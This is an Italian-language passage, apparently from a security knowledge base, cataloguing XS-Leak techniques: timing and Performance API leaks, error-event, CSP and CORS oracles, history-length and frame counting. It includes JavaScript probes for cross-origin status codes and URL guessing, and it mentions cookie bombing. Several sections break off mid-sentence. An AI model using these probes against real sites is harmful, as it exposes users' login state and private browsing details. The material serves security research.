* **Differenza Rilevabile**: Codice di Stato
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: Le richieste che generano un errore non possono essere unite.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

La tecnica √® stata trovata in una tabella nel documento citato, ma non √® stata trovata una descrizione della tecnica stessa. Tuttavia, √® possibile trovare il codice sorgente per verificarlo in [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Fuga di Pagina Vuota

* **Metodi di Inclusione**: Frame
* **Differenza Rilevabile**: Contenuto della Pagina
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: Le risposte vuote non creano voci di timing delle risorse.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Un attaccante pu√≤ rilevare se una richiesta ha generato un corpo di risposta HTTP vuoto perch√© le **pagine vuote non creano una voce di performance in alcuni browser**.

### Fuga di XSS-Auditor

* **Metodi di Inclusione**: Frame
* **Differenza Rilevabile**: Contenuto della Pagina
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: Utilizzando l'XSS Auditor nelle Security Assertions, gli attaccanti possono rilevare specifici elementi delle pagine web osservando le modifiche nelle risposte quando i payload creati attivano il meccanismo di filtraggio dell'auditor.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Nelle Security Assertions (SA), l'XSS Auditor, originariamente concepito per prevenire attacchi di Cross-Site Scripting (XSS), pu√≤ paradossalmente essere sfruttato per rivelare informazioni sensibili. Sebbene questa funzionalit√† integrata sia stata rimossa da Google Chrome (GC), √® ancora presente in SA. Nel 2013, Braun e Heiderich hanno dimostrato che l'XSS Auditor poteva bloccare erroneamente script legittimi, generando falsi positivi. Sulla base di ci√≤, i ricercatori hanno sviluppato tecniche per estrarre informazioni e rilevare contenuti specifici su pagine cross-origin, un concetto noto come XS-Leaks, inizialmente segnalato da Terada ed elaborato da Heyes in un post sul blog. Sebbene queste tecniche fossero specifiche per l'XSS Auditor in GC, √® stato scoperto che in SA, le pagine bloccate dall'XSS Auditor non generano voci nell'API di Performance, rivelando un metodo attraverso il quale potrebbero ancora essere rivelate informazioni sensibili.

### Fuga di X-Frame

* **Metodi di Inclusione**: Frame
* **Differenza Rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Sommario**: Una risorsa con l'intestazione X-Frame-Options non crea una voce di timing delle risorse.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Se una pagina **non √® consentita** essere **visualizzata** in un **iframe**, non crea una voce di performance. Di conseguenza, un attaccante pu√≤ rilevare l'intestazione di risposta **`X-Frame-Options`**.\
Lo stesso accade se si utilizza un tag **embed**.

### Rilevamento del Download

* **Metodi di Inclusione**: Frame
* **Differenza Rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: I download non creano voci di timing delle risorse nell'API di Performance.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Analogamente a quanto descritto per l'XS-Leak, una **risorsa che viene scaricata** a causa dell'intest
### Inizio della Redirezione

* **Metodi di Inclusione**: Frames
* **Differenza Rilevabile**: Redirezione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: L'ingresso del tempo delle risorse rivela l'inizio di una redirezione.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Abbiamo trovato un'istanza di XS-Leak che sfrutta il comportamento di alcuni browser che registrano troppe informazioni per le richieste cross-origin. Lo standard definisce un sottoinsieme di attributi che dovrebbero essere impostati a zero per le risorse cross-origin. Tuttavia, in **SA** √® possibile rilevare se l'utente viene **redirezionato** dalla pagina di destinazione, interrogando l'**API delle Prestazioni** e verificando i dati temporali di **redirectStart**.

### Durata della Redirezione

* **Metodi di Inclusione**: Fetch API
* **Differenza Rilevabile**: Redirezione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: La durata delle voci temporali √® negativa quando si verifica una redirezione.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC, la **durata** delle richieste che comportano una **redirezione** √® **negativa** e pu√≤ quindi essere **distinguibile** dalle richieste che non comportano una redirezione.

### CORP Leak

* **Metodi di Inclusione**: Frames
* **Differenza Rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Sommario**: Le risorse protette con CORP non creano voci temporali delle risorse.
* **Esempio di Codice**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In alcuni casi, l'**entry nextHopProtocol** pu√≤ essere utilizzata come tecnica di leak. In GC, quando l'intestazione **CORP** √® impostata, il nextHopProtocol sar√† **vuoto**. Si noti che SA non creer√† affatto una voce di prestazione per le risorse abilitate a CORP.

### Service Worker

* **Metodi di Inclusione**: Frames
* **Differenza Rilevabile**: Utilizzo dell'API
* **Ulteriori informazioni**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Sommario**: Rileva se un service worker √® registrato per un'origine specifica.
* **Esempio di Codice**:

I service worker sono contesti di script basati sugli eventi che vengono eseguiti in un'origine. Vengono eseguiti in background di una pagina web e possono intercettare, modificare e **memorizzare nella cache risorse** per creare applicazioni web offline.\
Se una **risorsa memorizzata nella cache** da un **service worker** viene accessa tramite **iframe**, la risorsa verr√† **caricata dalla cache del service worker**.\
Per rilevare se la risorsa √® stata **caricata dalla cache del service worker**, pu√≤ essere utilizzata l'**API delle Prestazioni**.\
Questo potrebbe essere fatto anche con un attacco di timing (controlla il documento per ulteriori informazioni).

### Cache

* **Metodi di Inclusione**: Fetch API
* **Differenza Rilevabile**: Temporizzazione
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Sommario**: √à possibile verificare se una risorsa √® memorizzata nella cache.
* **Esempio di Codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Utilizzando l'[API delle Prestazioni](xs-search.md#performance-api) √® possibile verificare se una risorsa √® memorizzata nella cache.

### Durata di Rete

* **Metodi di Inclusione**: Fetch API
* **Differenza Rilevabile**: Contenuto della Pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Sommario**: √à possibile recuperare la durata di rete di una richiesta dall'API `performance`.
* **Esempio di Codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Tecnica dei Messaggi di Errore

### Errore Multimediale

* **Metodi di Inclusione**: Elementi HTML (Video, Audio)
* **Differenza Rilevabile**: Codice di Stato
* **Ulteriori informazioni**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Sommario**: In Firefox √® possibile rilevare con precisione il codice di stato di una richiesta cross-origin.
* **Esempio di Codice**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
La propriet√† del messaggio dell'interfaccia `MediaError` identifica in modo univoco le risorse che vengono caricate correttamente con una stringa distinta. Un attaccante pu√≤ sfruttare questa caratteristica osservando il contenuto del messaggio, deducendo cos√¨ lo stato di risposta di una risorsa di origine incrociata.

### Errore CORS

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Sommario**: Nelle Security Assertions (SA), i messaggi di errore CORS rivelano involontariamente l'URL completo delle richieste reindirizzate.
* **Esempio di codice**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Questa tecnica consente a un attaccante di **evidenziare la destinazione di un reindirizzamento di un sito di origine incrociata** sfruttando il modo in cui i browser basati su Webkit gestiscono le richieste CORS. In particolare, quando viene inviata una **richiesta abilitata per CORS** a un sito di destinazione che emette un reindirizzamento in base allo stato dell'utente e il browser successivamente nega la richiesta, l'**URL completo della destinazione del reindirizzamento** viene rivelato all'interno del messaggio di errore. Questa vulnerabilit√† non solo rivela il fatto del reindirizzamento, ma espone anche il punto finale del reindirizzamento e eventuali **parametri di query sensibili** che potrebbe contenere.

### Errore SRI

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Sommario**: Nelle Security Assertions (SA), i messaggi di errore CORS rivelano involontariamente l'URL completo delle richieste reindirizzate.
* **Esempio di codice**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaccante pu√≤ sfruttare i **messaggi di errore dettagliati** per dedurre la dimensione delle risposte di origine incrociata. Questo √® possibile grazie al meccanismo di Subresource Integrity (SRI), che utilizza l'attributo di integrit√† per convalidare che le risorse recuperate, spesso da CDN, non siano state manomesse. Perch√© SRI funzioni su risorse di origine incrociata, queste devono essere **abilitate per CORS**; altrimenti, non sono soggette a controlli di integrit√†. Nelle Security Assertions (SA), proprio come l'errore CORS XS-Leak, √® possibile catturare un messaggio di errore dopo una richiesta fetch con un attributo di integrit√† non valido. Gli attaccanti possono deliberatamente **scatenare questo errore** assegnando un **valore hash falso** all'attributo di integrit√† di qualsiasi richiesta. Nelle SA, il messaggio di errore risultante rivela involontariamente la lunghezza del contenuto della risorsa richiesta. Questa fuga di informazioni consente a un attaccante di individuare variazioni nella dimensione della risposta, aprendo la strada a sofisticati attacchi XS-Leak.

### Violazione/Rilevamento CSP

* **Metodi di inclusione**: Pop-up
* **Differenza rilevabile**: Codice di stato
* **Ulteriori informazioni**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Sommario**: Se consentiamo solo il sito delle vittime nel CSP e tentiamo di reindirizzarlo a un dominio diverso, il CSP generer√† un errore rilevabile.
* **Esempio di codice**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak pu√≤ utilizzare il CSP per rilevare se un sito di origine incrociata √® stato reindirizzato a un'origine diversa. Questa fuga pu√≤ rilevare il reindirizzamento, ma inoltre, viene rivelato anche il dominio della destinazione del reindirizzamento. L'idea di base di questo attacco √® **consentire il dominio di destinazione sul sito dell'attaccante**. Una volta effettuata una richiesta al dominio di destinazione, questo si **reindirizza** a un dominio di origine incrociata. Il CSP **blocca** l'accesso ad esso e crea un **rapporto di violazione utilizzato come tecnica di fuga**. A seconda del browser, **questo rapporto pu√≤ rivelare la posizione di destinazione del reindirizzamento**.\
I browser moderni non indicheranno l'URL a cui √® stato reindirizzato, ma √® comunque possibile rilevare che √® stato attivato un reindirizzamento di origine incrociata.

### Cache

* **Metodi di inclusione**: Frame, Pop-up
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Sommario**: Cancella il file dalla cache. Apre la pagina di destinazione e verifica se il file √® presente nella cache.
* **Esempio di codice:**

I browser potrebbero utilizzare una cache condivisa per tutti i siti web. Indipendentemente dalla loro origine, √® possibile dedurre se una pagina di destinazione ha **richiesto un file specifico**.

Se una pagina carica un'immagine solo se l'utente ha effettuato l'accesso, √® possibile **invalidare** la **risorsa** (in modo che non sia pi√π memorizzata nella cache se lo era, vedi link per ulteriori informazioni), **effettuare una richiesta** che potrebbe caricare quella risorsa e provare a caricare la risorsa **con una richiesta errata** (ad esempio utilizzando un'intestazione referer troppo lunga). Se il caricamento della risorsa **non ha generato alcun errore**, √® perch√© era **memorizzata nella cache**.

### Direttiva CSP

* **Metodi di inclusione**: Frame
* **Differenza rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Sommario**: Le direttive dell'intestazione CSP possono essere esplorate utilizzando l'attributo iframe CSP, rivelando i dettagli della policy.
* **Esempio di codice**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Una nuova funzionalit√† in Google Chrome (GC) consente alle pagine web di **proporre una Content Security Policy (CSP)** impostando un attributo su un elemento iframe, con le direttive di policy trasmesse insieme alla richiesta HTTP. Normalmente, il contenuto incorporato deve **autorizzare ci√≤ tramite un'intestazione HTTP**, altrimenti viene visualizzata una **pagina di errore**. Tuttavia, se l'iframe √® gi√† governato da una CSP e la nuova policy proposta non √® pi√π restrittiva, la pagina verr√† caricata normalmente. Questo meccanismo apre una via per un attaccante per **rilevare direttive CSP specifiche** di una pagina di origine incrociata identificando la pagina di errore. Sebbene questa vulnerabilit√† sia stata segnalata come risolta, le nostre scoperte rivel
### CORB

* **Metodi di inclusione**: Elementi HTML
* **Differenza rilevabile**: Intestazioni
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Sommario**: CORB pu√≤ consentire agli attaccanti di rilevare la presenza dell'intestazione **`nosniff`** nella richiesta.
* **Esempio di codice**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Controlla il link per ulteriori informazioni sull'attacco.

### Errore CORS sulla configurazione errata di Origin Reflection <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Intestazioni
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Sommario**: Se l'intestazione Origin viene riflessa nell'intestazione `Access-Control-Allow-Origin`, √® possibile verificare se una risorsa √® gi√† presente nella cache.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Nel caso in cui l'intestazione **Origin** venga **riflessa** nell'intestazione `Access-Control-Allow-Origin`, un attaccante pu√≤ sfruttare questo comportamento per cercare di **recuperare** la **risorsa** in modalit√† **CORS**. Se **non viene** generato un **errore**, significa che √® stata **recuperata correttamente dal web**, se viene generato un errore, significa che √® stata **acceduta dalla cache** (l'errore appare perch√© la cache salva una risposta con un'intestazione CORS che consente il dominio originale e non il dominio dell'attaccante).\
Si noti che se l'origine non viene riflessa ma viene utilizzato un carattere jolly (`Access-Control-Allow-Origin: *`), ci√≤ non funzioner√†.

## Tecnica degli attributi leggibili

### Reindirizzamento Fetch

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Codice di stato
* **Ulteriori informazioni**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Sommario**: GC e SA consentono di verificare il tipo di risposta (opaque-redirect) dopo il completamento del reindirizzamento.
* **Esempio di codice**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Inviando una richiesta utilizzando la Fetch API con `redirect: "manual"` e altri parametri, √® possibile leggere l'attributo `response.type` e se √® uguale a `opaqueredirect`, allora la risposta era un reindirizzamento.

### COOP

* **Metodi di inclusione**: Pop-up
* **Differenza rilevabile**: Intestazione
* **Ulteriori informazioni**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Sommario**: Le pagine protette dalla Cross-Origin Opener Policy (COOP) impediscono l'accesso alle interazioni tra origini diverse.
* **Esempio di codice**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un attaccante √® in grado di dedurre la presenza dell'intestazione Cross-Origin Opener Policy (COOP) in una risposta HTTP tra origini diverse. COOP viene utilizzata dalle applicazioni web per impedire ai siti esterni di ottenere riferimenti di finestre arbitrari. La visibilit√† di questa intestazione pu√≤ essere individuata tentando di accedere al riferimento **`contentWindow`**. Nei casi in cui COOP viene applicata in modo condizionale, la propriet√† **`opener`** diventa un indicatore rivelatore: √® **non definita** quando COOP √® attiva e **definita** in sua assenza.

### Lunghezza massima dell'URL - Lato server

* **Metodi di inclusione**: Fetch API, Elementi HTML
* **Differenza rilevabile**: Codice di stato / Contenuto
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Sommario**: Rileva le differenze nelle risposte a causa della lunghezza della risposta di reindirizzamento che potrebbe essere troppo grande e il server risponde con un errore e viene generato un avviso.
* **Esempio di codice**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Se un reindirizzamento lato server utilizza **input utente all'interno del reindirizzamento** e **dati aggiuntivi**. √à possibile rilevare questo comportamento perch√© di solito i **server** hanno un **limite di lunghezza della richiesta**. Se i **dati dell'utente** hanno quella **lunghezza - 1**, perch√© il **reindirizzamento** sta utilizzando **quei dati** e **aggiungendo** qualcosa **in pi√π**, verr√† generato un **errore rilevabile tramite Error Events**.

Se riesci in qualche modo a impostare i cookie per un utente, puoi anche eseguire questo attacco **impostando abbastanza cookie** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) in modo che con la **dimensione aumentata della risposta** della **risposta corretta** venga generato un **errore**. In questo caso, ricorda che se attivi questa richiesta da un sito stesso, `<script>` invier√† automaticamente i cookie (quindi puoi controllare gli errori).\
Un esempio di **cookie bomb + XS-Search** pu√≤ essere trovato nella soluzione intenzionale di questo writeup: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Di solito √® necessario utilizzare `SameSite=None` o essere nello stesso contesto per questo tipo di attacco.

### Lunghezza massima dell'URL - Lato client

* **Metodi di inclusione**: Pop-up
* **Differenza rilevabile**: Codice di stato / Contenuto
* **Ulteriori informazioni**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Sommario**: Rileva le differenze nelle risposte a causa della lunghezza della risposta di reindirizzamento che potrebbe essere troppo grande per una richiesta in modo che sia possibile notare una differenza.
* **Esempio di codice**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Secondo la [documentazione di Chromium](https://
### Numero massimo di reindirizzamenti

* **Metodi di inclusione**: Fetch API, Frames
* **Differenza rilevabile**: Codice di stato
* **Ulteriori informazioni**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Sommario**: Utilizzare il limite di reindirizzamenti del browser per verificare la presenza di reindirizzamenti URL.
* **Esempio di codice**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Se il numero massimo di reindirizzamenti da seguire di un browser √® 20, un attaccante potrebbe provare a caricare la sua pagina con 19 reindirizzamenti e infine inviare la vittima alla pagina testata. Se viene generato un errore, significa che la pagina stava cercando di reindirizzare la vittima.

### Lunghezza della cronologia

* **Metodi di inclusione**: Frames, Pop-up
* **Differenza rilevabile**: Reindirizzamenti
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Sommario**: Il codice JavaScript manipola la cronologia del browser e pu√≤ essere accessibile tramite la propriet√† length.
* **Esempio di codice**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

L'API della cronologia consente al codice JavaScript di manipolare la cronologia del browser, che salva le pagine visitate da un utente. Un attaccante pu√≤ utilizzare la propriet√† length come metodo di inclusione: per rilevare la navigazione JavaScript e HTML.\
Controllando `history.length`, facendo navigare un utente su una pagina, cambiandola nuovamente con la stessa origine e verificando il nuovo valore di `history.length`.

### Lunghezza della cronologia con la stessa URL

* **Metodi di inclusione**: Frames, Pop-up
* **Differenza rilevabile**: Se l'URL √® uguale a quello indovinato
* **Sommario**: √à possibile indovinare se la posizione di un frame/pop-up √® in un URL specifico sfruttando la lunghezza della cronologia.
* **Esempio di codice**: Di seguito

Un attaccante potrebbe utilizzare il codice JavaScript per manipolare la posizione del frame/pop-up a un URL indovinato e cambiarlo immediatamente a `about:blank`. Se la lunghezza della cronologia aumenta, significa che l'URL era corretto ed √® riuscito ad aumentare perch√© l'URL non viene ricaricato se √® lo stesso. Se non aumenta, significa che ha cercato di caricare l'URL indovinato ma perch√© abbiamo caricato immediatamente `about:blank` dopo, la lunghezza della cronologia non √® mai aumentata durante il caricamento dell'URL indovinato.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteggio dei frame

* **Metodi di inclusione**: Frame, Pop-up
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Sommario**: Valutare la quantit√† di elementi `iframe` ispezionando la propriet√† `window.length`.
* **Esempio di codice**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contare il **numero di frame in una pagina web** aperta tramite `iframe` o `window.open` potrebbe aiutare a identificare lo **stato dell'utente su quella pagina**.\
Inoltre, se la pagina ha sempre lo stesso numero di frame, controllare **continuamente** il numero di frame potrebbe aiutare a identificare un **pattern** che potrebbe rivelare informazioni.

Un esempio di questa tecnica √® che in Chrome, un **PDF** pu√≤ essere **rilevato** con il **conteggio dei frame** perch√© viene utilizzato internamente un `embed`. Ci sono [Parametri di URL aperti](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) che consentono un certo controllo sul contenuto come `zoom`, `view`, `page`, `toolbar` dove questa tecnica potrebbe essere interessante.

### HTMLElements

* **Metodi di inclusione**: Elementi HTML
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Sommario**: Leggere il valore rivelato per distinguere tra 2 possibili stati
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

La divulgazione di informazioni attraverso gli elementi HTML √® una preoccupazione per la sicurezza web, in particolare quando vengono generati file multimediali dinamici basati sulle informazioni dell'utente o quando vengono aggiunti filigrane che alterano le dimensioni dei media. Ci√≤ pu√≤ essere sfruttato dagli attaccanti per differenziare tra possibili stati analizzando le informazioni esposte da determinati elementi HTML.

### Informazioni Esposte dagli Elementi HTML

- **HTMLMediaElement**: Questo elemento rivela i tempi di `duration` e `buffered` dei media, che possono essere accessibili tramite la sua API.
[Leggi di pi√π su HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Espone `videoHeight` e `videoWidth`. In alcuni browser, sono disponibili propriet√† aggiuntive come `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` e `webkitDecodedFrameCount`, che offrono informazioni pi√π dettagliate sul contenuto multimediale.
[Leggi di pi√π su HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Questa funzione fornisce dettagli sulla qualit√† della riproduzione video, inclusi `totalVideoFrames`, che pu√≤ indicare la quantit√† di dati video elaborati.
[Leggi di pi√π su getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Questo elemento rivela l'altezza (`height`) e la larghezza (`width`) di un'immagine. Tuttavia, se un'immagine non √® valida, queste propriet√† restituiranno 0 e la funzione `image.decode()` verr√† rifiutata, indicando il mancato caricamento corretto dell'immagine.
[Leggi di pi√π su HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### Propriet√† CSS

* **Metodi di inclusione**: Elementi HTML
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Sommario**: Identificare variazioni nello stile del sito web che correlano con lo stato o lo stato dell'utente.
* **Esempio di codice**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

